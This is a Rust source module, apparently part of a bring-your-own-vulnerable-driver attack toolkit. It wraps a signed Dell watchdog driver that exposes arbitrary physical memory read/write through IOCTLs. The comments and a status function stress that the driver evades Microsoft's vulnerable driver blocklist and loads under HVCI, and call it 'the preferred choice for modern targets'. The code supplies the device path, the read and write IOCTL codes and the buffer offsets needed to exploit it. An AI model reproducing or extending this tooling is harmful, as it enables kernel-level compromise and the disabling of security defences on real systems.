//! WDTKernel.sys — Dell Watchdog Timer (LOLDrivers #290, April 2026).
//!
//! **Status: NOT blocklisted** as of July 2026. WHQL signed, distributed
//! via Microsoft Update Catalog. Loads even under HVCI.
//!
//! Device: `\\.\WatchdogTimer`
//! 12 IOCTLs for arbitrary physical memory r/w via MmMapIoSpace.
//! 12 IOCTLs for unrestricted I/O port access.
//! 2 IOCTLs for PCI config space access.
//!
//! **HVCI compatibility**: this driver loads and functions with HVCI enabled,
//! making it the preferred choice for modern targets.
//!
//! Read IOCTL:  0x9C402580
//! Write IOCTL: 0x9C402584
//! Layout: standard 48-byte, address at offset 0x08.
//!
//! Source: github.com/magicsword-io/LOLDrivers/issues/290

use crate::byovd::VulnDriverIoctl;

pub struct WdtKernel;

impl VulnDriverIoctl for WdtKernel {
    fn device_path(&self) -> &[u16] {
        static PATH: [u16; 17] = [
            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
            'W' as u16, 'a' as u16, 't' as u16, 'c' as u16,
            'h' as u16, 'd' as u16, 'o' as u16, 'g' as u16,
            'T' as u16, 'i' as u16, 'm' as u16, 'e' as u16,
            'r' as u16,
        ];
        &PATH
    }
    fn read_ioctl(&self) -> u32 { 0x9C402580 }
    fn write_ioctl(&self) -> u32 { 0x9C402584 }
    fn addr_offset(&self) -> usize { 0x08 }
    fn blocklist_status(&self) -> &'static str {
        "CLEAN: not on Microsoft Vulnerable Driver Blocklist as of July 2026. HVCI-compatible (WHQL)."
    }
}
